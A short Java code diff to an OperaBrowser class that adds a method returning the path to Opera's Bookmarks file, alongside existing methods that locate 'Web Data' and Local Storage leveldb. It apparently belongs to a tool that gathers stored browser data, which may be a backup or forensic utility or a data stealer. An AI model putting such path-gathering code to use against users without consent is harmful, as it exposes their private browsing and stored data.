@@ -23,7 +23,12 @@ public class OperaBrowser extends BrowserModule {
 		String data = OSTools.isOSLinux() ? "Web\\ Data" : "Web Data";
 		return getFolder() + "/" + data;
 	}
-	
+
+	@Override
+	public String getBookmarks() {
+		return getFolder() + "/Bookmarks";
+	}
+
 	@Override
 	public String getLevelDB() {
 		return getFolder() + "/Local Storage/leveldb";
